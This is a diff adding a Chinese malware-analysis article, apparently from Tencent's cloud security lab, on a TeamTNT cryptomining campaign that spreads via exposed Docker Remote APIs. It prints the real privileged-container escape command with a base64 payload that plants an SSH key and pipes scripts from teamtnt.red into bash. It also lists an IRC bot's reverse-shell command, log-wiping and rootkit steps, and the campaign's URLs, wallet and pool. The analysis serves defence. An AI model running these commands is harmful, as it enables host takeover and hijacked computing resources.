@@ -1,0 +1,451 @@
+# 一、背景
+
+腾讯安全云鼎实验室持续监控云原生在野攻击威胁态势，继DockerHub发现百万下载量黑产镜像（详见文章DockerHub再现百万下载量黑产镜像，小心你的容器被挖矿）之后，近期实验室最新捕获到TeamTNT黑客团队新型在野容器攻击活动，相比之前TeamTNT挖矿木马，此次新型攻击手法对原挖矿木马进行了升级，并利用容器环境进行感染传播。
+
+通过对TeamTNT新型容器攻击样本详细分析，我们发现挖矿病毒是通过扫描docker remote
+api未授权访问漏洞进行传播。相比之前TeamTNT黑客团队出的挖矿木马，此次对原挖矿木马进行了升级，在进行感染时使用了新的策略。入侵后会先进行清理其他挖矿，并使用新的隐藏进程方法，入侵完毕后会清理痕迹，覆盖系统日志以逃避排查，为增加挖矿木马植入的成功率还有备用挖矿程序，增加木马的稳定性，利用nohup命令不挂断地运行挖矿，并且在使用LKM
+rootkit技术隐藏进程。
+
+该样本属于最新版本TEAMTNT样本，被云鼎实验室哨兵系统（云上分布式蜜罐和沙箱）第一时间捕获。本文将会使用ATT&CK矩阵溯源分析样本在入侵、持久化、容器逃逸等完整攻击路径，为大家清晰还原黑客攻击手法和全貌。
+
+# 二、样本产生时间与流行分析
+
+样本的开发时间大约在2021年09月14日编写完毕，云鼎实验室哨兵系统在9月14号第一时间捕获，并进行了详细的分析。
+
+![](https://image.3001.net/images/20211020/1634719808_616fd840eca2ecb2ce913.jpg!small)![](https://image.3001.net/images/20211020/1634719818_616fd84a0b77e88251e4e.jpg!small)
+
+ **哨兵捕获的网络包：**
+
+![](https://image.3001.net/images/20211020/1634719828_616fd854cca875e56fd6a.jpg!small)
+
+ **样本流行程度：**
+
+通过哨兵智能情报统计系统，样本在刚刚爆发的2周内较为流行，随后感染率持续下降。
+
+![](https://image.3001.net/images/20211020/1634719854_616fd86e498708e97eaa3.jpg!small)
+
+# 三、样本att&ck矩阵分析
+
+TEAMTNT的新样本通过docker remote API传播，过程中使用了 特权容器，容器逃逸，LKM rootkit
+等先进攻击方式，下面是对于整个攻击过程的ATT&CK矩阵。
+
+![](https://image.3001.net/images/20211020/1634719867_616fd87b28d00b7b46953.jpg!small)
+
+ **下图为攻击流程，我们将整个过程分为五个部分讲解：1、初始化访问与对外扫描 2、执行3、权限提升-容器逃逸 4、攻击持久化 5、防御绕过**
+
+![](https://image.3001.net/images/20211020/1634719883_616fd88b08b74e9b2bd91.jpg!small)
+
+ **3.1 攻击向量-初始访问与横向扫描—Remote API 漏洞：**
+
+ **DockerRemote API ：** 是一个取代远程命令行界面（rcli）的REST API，默认绑定2375端口。Docker Remote
+API如配置不当可导致未授权访问，攻击者利用 docker client 或者 http 直接请求就可以访问这个
+API，可能导致敏感信息泄露，黑客也可以删除Docker上的数据。攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器。
+
+ **A、扫描获取docker API版本**
+
+ **调用masscan 和 zgrab扫描目标IP，通过请求旧版本的命令，可以获取到最新的docker API版本。**
+
+ **通常获取1.16版本，会返回如下信息：**
+
+Handler for GET /v1.16/version returned error: client version 1.16 is too old.
+Minimum supported API version is 1.24, please upgrade your client to a newer
+version
+
+相关代码如下：
+
+![](https://image.3001.net/images/20211020/1634719893_616fd8952a79538321499.jpg!small)
+
+ **B、利用Remote API漏洞：**
+
+ **直接通过Remote API漏洞，远程启动传播病毒的容器镜像
+alpineos/dockerapi，容器使用完成后会自动清除容器内部的文件系统。启动alpine 容器进行容器逃逸。**
+
+![](https://image.3001.net/images/20211020/1634719903_616fd89fb0af4e0cb1568.jpg!small)
+
+通过腾讯云容器安全服务TCSS发现存在Remote API未授权访问风险节点和详细信息：
+
+![](https://image.3001.net/images/20211020/1634719913_616fd8a95baff0bc905ce.jpg!small)
+
+ **3.2 攻击向量-执行：**
+
+在目标机器上的命令执行通过特权容器执行恶意指令，进行挖矿和病毒传播。
+
+ **A、恶意镜像alpineos/dockerapi：**
+
+![](https://image.3001.net/images/20211020/1634719922_616fd8b2c2c46cdd891a0.jpg!small)
+
+经查询，alpineos帐号注册时间为2021年5月26日，其中alpineos/dockerapi镜像更新时间为截止目前已有一个月，大约有7600台主机被感染。
+
+![](https://image.3001.net/images/20211020/1634719931_616fd8bb27bd34522ec9d.jpg!small)
+
+通过腾讯云容器安全服务TCSS对该镜像进行扫描，发现该镜像存在木马病毒，扫描结果如下图：
+
+![](https://image.3001.net/images/20211020/1634719960_616fd8d8186de37afd34a.jpg!small)
+
+镜像启动时会执行名为pause的脚本，pause脚本用于病毒的传播。
+
+![](https://image.3001.net/images/20211020/1634719971_616fd8e32384fc0f9d718.jpg!small)
+
+ **B、镜像Alpine**
+
+ **正规白镜像，镜像大小只有5M，方便下载，teamTNT使用这个镜像进行容器逃逸。**
+
+![](https://image.3001.net/images/20211020/1634719986_616fd8f2aa2f353c8d862.jpg!small)
+
+ **3.3攻击向量-权限提升----Docker逃逸：**
+
+TEAMTNT 使用的逃逸方法是 **特权模式+SSH**
+
+特权模式在6.0版本的时候被引入Docker，其核心作用是允许容器内的root拥有外部物理机的root权限，而此前在容器内的root用户只有外部物理机普通用户的权限。
+
+使用特权模式启动容器后（docker run --privileged），Docker容器被允许可以访问主机上的所有设备、可以获取大量设备文件的访问权限。
+
+TEAMTNT 病毒容器运行的逃逸命令如下：
+
+ **docker** -H $D_TARGET run -d --privileged --net host -v /:/host alpine
+
+ **chroot** /host bash -c 'echo
+c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKCmNoYXR0ciAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IHRudHJlY2h0IC1SIC1pYSAvcm9vdC8uc3NoLyAyPi9kZXYvbnVsbDsgaWNoZGFyZiAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGwKY2F0IC90bXAvVGVhbVROVC5wdWIgPj4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMKY2F0IC90bXAvVGVhbVROVC5wdWIgPiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIKcm0gLWYgL3RtcC9UZWFtVE5ULnB1YgoKCnNzaCAtb1N0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtb0JhdGNoTW9kZT15ZXMgLW9Db25uZWN0VGltZW91dD01IC1pIC90bXAvVGVhbVROVCByb290QDEyNy4wLjAuMSAiKGN1cmwgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHxjZDEgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHx3Z2V0IC1xIC1PLSBodHRwOi8vdGVhbXRudC5yZWQvc2gvc2V0dXAvbW9uZXJvb2NlYW5fbWluZXIuc2h8fHdkMSAtcSAtTy0gaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNoKXxiYXNoIgoKcm0gLWYgL3RtcC9UZWFtVE5UCgo=
+| base64 -d | bash'
+
+ **第一步：创建特权容器**
+
+ **docker** -H $D_TARGET run -d -- **privileged** \--net host -v /:/host
+alpine
+
+容器本身为干净的alpine容器。
+
+ **第二步：SSH容器逃逸**
+
+在root目录下 拷贝ssh密钥到宿主机，通过访问127.0.0.1 从而进行容器逃逸。
+
+上述代码解密后如下：
+
+![](https://image.3001.net/images/20211020/1634720006_616fd906a7da9bea79d7a.jpg!small)
+
+逃逸后，可以在宿主机上下载moneroocean_miner.sh等脚本进行挖矿。
+
+ **3.4攻击向量-防御绕过----清理痕迹与进程隐藏：**
+
+在植入挖矿病毒后，会通过diamorphine.sh来隐藏进程，之后清理痕迹。
+
+![](https://image.3001.net/images/20211020/1634720022_616fd916b1743e6025457.jpg!small)
+
+ **A、通过diamorphine.sh 隐藏进程：**
+
+从github.com/m0nad/Diamorphine下载安装编译Diamorphine，加载内核模块dia.ko。
+
+![](https://image.3001.net/images/20211020/1634720053_616fd935dc5ba085baba3.jpg!small)
+
+Diamorphine是一个LKM rootkit ，功能就是 进程隐藏、模块隐藏，用户root权限获取，带有Magic-prefix
+开头的文件和目录隐藏。
+
+ **这里重点介绍一下 进程隐藏部分。**
+
+Rootkit初始化部分会hook getdents、getdents64 和kill 三个函数，其中被hook的kill
+函数用于接受命令，进行进程隐藏、root等动作。
+
+![](https://image.3001.net/images/20211020/1634720064_616fd94032060c3cdf5e9.jpg!small)
+
+Hacked_kill 定义了3个参数，31 用来隐藏进程，64用来获取root，63用来隐藏自身模块。
+
+![](https://image.3001.net/images/20211020/1634720074_616fd94a5fab56fd46536.jpg!small)
+
+被hook的kill代码如下：
+
+![](https://image.3001.net/images/20211020/1634720088_616fd958d1bb10d6e690b.jpg!small)
+
+通过 for_each_process遍历进程列表找到目标进程，把进程标志设置为PF_INVISIBLE 从而达到隐藏进程的目标。
+
+Find_task代码如下：
+
+![](https://image.3001.net/images/20211020/1634720115_616fd97395fc05a8eafe4.jpg!small)
+
+通过kill命令的31信号隐藏挖矿进程（xmrig），并清理记录
+
+![](https://image.3001.net/images/20211020/1634720129_616fd98147276d3b84242.jpg!small)
+
+ **B、痕迹清理**
+
+ **清除命令历史记录：**
+
+ **通过删除/bash_history 和 执行history -c 命令，清除命令历史记录。**
+
+ **清除wtmp,secure、cron 和mail 日志。**
+
+![](https://image.3001.net/images/20211020/1634720143_616fd98fe18dfe61a25cc.jpg!small)
+
+ **C、ld.so.preload清理模块**
+
+ld.so.preload清理模块使用了base64编码，解密后可以看到以下功能。
+
+检查/etc/ld.so.preload预加载文件，删除空的ld.so.preload文件，如果ld.so.preload有预加载程序，则对其进行清理。
+
+![](https://image.3001.net/images/20211020/1634720154_616fd99a33be5d74570e1.jpg!small)
+
+为了能成功删除，重新写了文件删除函数。文件删除函数中使用了chattr和intrecht、ichdarf三个命令，这三个命令实为同一种功能，TeamTNT黑客团队曾经在入侵时，重命名过系统命令。为能成功执行，系统命令和重命名过的命令一起执行，以提高成功率。
+
+![](https://image.3001.net/images/20211020/1634720166_616fd9a6629dd3b767ab7.jpg!small)
+
+ **3.5攻击向量—持久化—释放远控**
+
+TEAMTNT会下载Chimaera IRC 远控木马，木马没有加壳，功能较为丰富，这里不做过多介绍。
+
+![](https://image.3001.net/images/20211020/1634720182_616fd9b6924c189d58ac2.jpg!small)
+
+相关命令和描述如下图所示：
+
+![](https://image.3001.net/images/20211020/1634720196_616fd9c4ea4f56d6ca647.jpg!small)
+
+整理后如下表所示：
+
+ **Command**
+
+|
+
+ **Description (from the binary)**  
+  
+---|---  
+  
+NICK <nick>
+
+|
+
+Changes the nick of the client  
+  
+SERVER <server>
+
+|
+
+Changes servers  
+  
+GETSPOOFS
+
+|
+
+Gets the current spoofing  
+  
+SPOOFS <subnet>
+
+|
+
+Changes spoofing to a subnet  
+  
+DISABLE
+
+|
+
+Disables all packeting from this client  
+  
+ENABLE
+
+|
+
+Enables all packeting from this client  
+  
+GET <http address> <save as>
+
+|
+
+Downloads a file off the web and saves it onto the hd  
+  
+UPDATE <http address> <src:bin>
+
+|
+
+Update this bot  
+  
+HACKPKG <http address> <bin name>
+
+|
+
+HackPkg is here! Install a bin, using http, no depends!  
+  
+VERSION
+
+|
+
+Requests version of client  
+  
+HELP
+
+|
+
+Displays this  
+  
+IRC <command>
+
+|
+
+Sends this command to the server  
+  
+SH <command>
+
+|
+
+Executes a command  
+  
+ISH <command>
+
+|
+
+SH, interactive, sends to channel  
+  
+SHD <command>
+
+|
+
+Executes a pseudo-daemonized command  
+  
+GETBB <tftp server>
+
+|
+
+Get a proper busybox  
+  
+INSTALL <http server/file_name>
+
+|
+
+Download & install a binary to /var/bin  
+  
+BASH <cmd>
+
+|
+
+Execute commands using bash.  
+  
+BINUPDATE <http:server/package>
+
+|
+
+Update a binary in /var/bin via wget  
+  
+SCAN <nmap options>
+
+|
+
+Call the nmap wrapper script and scan with your opts.  
+  
+RSHELL <server> <port>
+
+|
+
+Equates to nohup nc ip port -e /bin/sh  
+  
+LOCKUP <http:server>
+
+|
+
+Kill telnet, d/l aes backdoor from <server>, run that instead.  
+  
+GETSSH <http:server/dropbearmulti>
+
+|
+
+D/l, install, configure and start dropbear on port 30022  
+  
+TOETEDENCLIENT
+
+|
+
+Kill client  
+  
+UPDATE
+
+|
+
+update  
+  
+# 四、挖矿部分分析
+
+ **Moneroocean.sh脚本主要用来挖矿：**
+
+更改linux最大文件句柄数的限制，以提高稳定性。并配置防火墙，放行数据包。
+
+![](https://image.3001.net/images/20211020/1634720216_616fd9d88fd01d1122e2e.jpg!small)
+
+清理动态预加载预加载ld.preload，木马通常使用使用此技术来隐藏木马文件，可以实现劫持，TeamTNT团队的新挖矿程序，清理了此加载文件，更换隐藏技术，并且可以排除其他挖矿程序，以达到资源独占。清理模块使用了base64编码，上文有进一步分析。
+
+![](https://image.3001.net/images/20211020/1634720244_616fd9f47f5fb95c7c504.jpg!small)
+
+清理其他部分主流挖矿域名：
+
+![](https://image.3001.net/images/20211020/1634720258_616fda02146131bfb471a.jpg!small)
+
+还原ps命令，并清理定时任务，有些挖矿木马存在修改系统命令：
+
+![](https://image.3001.net/images/20211020/1634720284_616fda1ca73afa9be4255.jpg!small)
+
+清理痕迹，清空系统日志，脚本最后有调用。
+
+![](https://image.3001.net/images/20211020/1634720297_616fda295b6d2aabbc119.jpg!small)
+
+清理其他挖矿程序，简单粗暴判定CPU占用65%以上的都为挖矿程序，并结束进程，以达到资源独占的目的。![](https://image.3001.net/images/20211020/1634720307_616fda33c5fe2dd925f90.jpg!small)
+
+实现下载功能，实现类似wget curl功能，用于下载wget curl：
+
+![](https://image.3001.net/images/20211020/1634721092_616fdd44ba310729380de.jpg!small)
+
+检查系统中是否有curl，如果没有则从自己服务器上下载curl程序：
+
+![](https://image.3001.net/images/20211020/1634721064_616fdd286d7cf123ce01a.jpg!small)
+
+下载钱包文件，并准备两个挖矿安装包，其中一个为备用安装包：
+
+![](https://image.3001.net/images/20211020/1634721048_616fdd18a5c2bf795d873.jpg!small)
+
+中止原有的的挖矿程序，下载新版挖矿木马后重命名，并解压后删除安装包
+
+![](https://image.3001.net/images/20211020/1634721035_616fdd0be6a1d0f482b29.jpg!small)
+
+检测挖矿程序是否正常工作，如果被破坏则下载备用挖矿程序，解压后删除安装包
+
+![](https://image.3001.net/images/20211020/1634721021_616fdcfdbeef8ef1a209b.jpg!small)
+
+设置挖矿密码，把用户钱包，密码，矿池地址写入配置文件，并重命名为“config_background.json”。
+
+![](https://image.3001.net/images/20211020/1634721010_616fdcf269908d3f5bdde.jpg!small)
+
+创建miner.sh脚本，把脚本写入.profile，以便在登陆时在后台运行。
+
+![](https://image.3001.net/images/20211020/1634720992_616fdce04d3e13da2328a.jpg!small)
+
+修改大页内存hugepages值，以提高挖矿效率。
+
+![](https://image.3001.net/images/20211020/1634720981_616fdcd56333ae634cda7.jpg!small)
+
+创建挖矿服务，服务名为“SystemRaid.service”。
+
+![](https://image.3001.net/images/20211020/1634720963_616fdcc316568087043bd.jpg!small)
+
+增加挖矿木马的健壮性，将挖矿程序在后台运行。
+
+![](https://image.3001.net/images/20211020/1634720949_616fdcb5a2053440b46e5.jpg!small)
+
+清理痕迹并通过执行diamorphine.sh来隐藏进程。
+
+ **挖矿信息总结：**
+
+矿池：dl.chimaera.cc:21582
+
+钱包：
+
+>
+> 89sp1qMoognSAbJTprreTXXUv9RG1AJBRjZ3CFg4rn6afQ5hRuqxiWRivYNqZbnYKKdsH5pCiTffrZToSyzXRfMvSHx5Guq
+
+首选挖矿程序：
+
+> http://teamtnt.red/sh/bin/xmrig/x86_64/mo.tar.gz
+
+备用挖矿程序：
+
+> https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-> static-x64.tar.gz
+>
+>
+> URL：http://teamtnt.red/sh/setup/moneroocean_miner.sh；http://teamtnt.red/sh/setup/diamorphine.sh
+
+# 五、如何防御
+
+腾讯安全持续在容器安全上进行投入和相关研究，构建了完整的容器安全防护和服务保障体系，针对容器环境下的安全问题，腾讯云容器安全服务通过资产管理、镜像安全、运行时安全、安全基线四大核心能力来保障容器的全生命周期安全，为企业提供镜像扫描、运行时安全检测（容器逃逸、反弹shell、文件查杀）、高级防御（异常进程拦截、文件篡改保护、高危系统调用监控）、安全基线检测、资产管理一站式容器安全防护。容器安全服务已集成腾讯云鼎实验室最新容器安全情报，可第一时间检测黑产容器镜像，并针对新型在野攻击进行有效防御，企业可通过容器安全服务及时发现容器安全风险并快速构建容器安全防护体系。
+
